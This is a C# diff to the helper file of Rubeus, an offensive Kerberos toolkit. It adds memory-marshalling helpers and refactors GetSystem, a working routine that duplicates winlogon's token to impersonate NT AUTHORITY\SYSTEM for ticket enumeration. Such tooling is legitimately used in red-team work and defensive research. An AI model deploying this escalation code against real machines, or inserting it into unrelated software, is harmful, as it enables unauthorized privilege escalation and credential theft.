@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text.RegularExpressions;
 
@@ -13,6 +14,40 @@ namespace Rubeus
 {
     internal static class Helpers
     {
+        internal static IntPtr AllocAndInit<T>(T managed, int additionalSpace = 0)
+        {
+            int realSize;
+            return AllocAndInit<T>(managed, out realSize, additionalSpace);
+        }
+
+        internal static IntPtr AllocAndInit<T>(T managed, out int realSize, int additionalSpace = 0)
+        {
+            if (0 > additionalSpace) {
+                throw new ArgumentOutOfRangeException();
+            }
+            int baseStructureSize = Marshal.SizeOf(typeof(T));
+            realSize = baseStructureSize + additionalSpace;
+            IntPtr result = Marshal.AllocHGlobal(realSize);
+            // marshal the struct from a managed object to an unmanaged block of memory.
+            Marshal.StructureToPtr(managed, result, false);
+            return result;
+        }
+
+        internal static void AppendUnicodeString<T>(IntPtr nativeBuffer, Interop.UNICODE_STRING data,
+            string fieldName)
+        {
+            Type targetType = typeof(T);
+            // Set pointer to end of T structure
+            IntPtr nativeDataBuffer = (IntPtr)(nativeBuffer.ToInt64() + Marshal.SizeOf(targetType));
+            // Copy unicode chars to the new location
+            Interop.CopyMemory(nativeDataBuffer, data.Buffer, data.MaximumLength);
+            // Update the target name buffer ptr            
+            Marshal.WriteIntPtr(nativeBuffer,
+                Marshal.OffsetOf(targetType, fieldName).ToInt32() +
+                    Marshal.OffsetOf(typeof(Interop.UNICODE_STRING), "Buffer").ToInt32(),
+                nativeDataBuffer);
+        }
+
         internal static void DisplayKerberosError(AsnElt from)
         {
             long errorCode = new KRB_ERROR(from.FirstElement).ErrorCode;
@@ -41,46 +76,40 @@ namespace Rubeus
                 : defaultValue;
         }
 
-        public static bool GetSystem()
+        internal static bool GetSystem()
         {
             // helper to elevate to SYSTEM for Kerberos ticket enumeration via token impersonation
-            if (IsHighIntegrity()) {
-                IntPtr hToken = IntPtr.Zero;
+            if (!IsHighIntegrity()) {
+                return false;
+            }
+            IntPtr hToken = IntPtr.Zero;
+            IntPtr hDupToken = IntPtr.Zero;
 
-                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with DuplicateToken
-                Process[] processes = Process.GetProcessesByName("winlogon");
-                IntPtr handle = processes[0].Handle;
+            try {
+                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy
+                // of the token with DuplicateToken
+                IntPtr handle = Process.GetProcessesByName("winlogon")[0].Handle;
 
                 // TOKEN_DUPLICATE = 0x0002
-                bool success = Interop.OpenProcessToken(handle, 0x0002, out hToken);
-                if (!success) {
-                    //Console.WriteLine("OpenProcessToken failed!");
-                    return false;
-                }
-
-                // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
-                // 2 == SecurityImpersonation
-                IntPtr hDupToken = IntPtr.Zero;
-                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
-                if (!success) {
-                    //Console.WriteLine("DuplicateToken failed!");
-                    return false;
-                }
-
-                success = Interop.ImpersonateLoggedOnUser(hDupToken);
-                if (!success) {
-                    //Console.WriteLine("ImpersonateLoggedOnUser failed!");
-                    return false;
-                }
-
-                // clean up the handles we created
-                Interop.CloseHandle(hToken);
-                Interop.CloseHandle(hDupToken);
-
-                string name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-                return (name == "NT AUTHORITY\\SYSTEM");
+                return TraceFailure(Interop.OpenProcessToken(handle, 0x0002, out hToken),
+                    "OpenProcessToken failed!")
+                    // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
+                    // 2 == SecurityImpersonation
+                    && TraceFailure(Interop.DuplicateToken(hToken, 2, ref hDupToken),
+                        "DuplicateToken failed!")
+                    && TraceFailure(Interop.ImpersonateLoggedOnUser(hDupToken),
+                        "ImpersonateLoggedOnUser failed!")
+                    && (WindowsIdentity.GetCurrent().Name == "NT AUTHORITY\\SYSTEM");
             }
-            return false;
+            finally {
+                // clean up the handles we created
+                if (IntPtr.Zero != hToken) {
+                    Interop.CloseHandle(hToken);
+                }
+                if (IntPtr.Zero != hDupToken) {
+                    Interop.CloseHandle(hDupToken);
+                }
+            }
         }
 
         internal static string GetNativeErrorMessage(uint nativeErrorCode)
@@ -195,10 +224,19 @@ namespace Rubeus
                 .ToArray();
         }
 
+        private static bool TraceFailure(bool success, string errorMessage = null)
+        {
+            if (success) { return true; }
+            if (string.IsNullOrEmpty(errorMessage)) { return false; }
+            Console.WriteLine("\r\n[X] {0}\r\n", errorMessage);
+            return false;
+        }
+
         internal static void ValidateNativeCall(NativeReturnCode code)
         {
         }
 
+        internal static readonly DateTime BaseDate = new DateTime(1601, 1, 1, 0, 0, 0, 0);
         private static Random random = new Random();
     }
 }
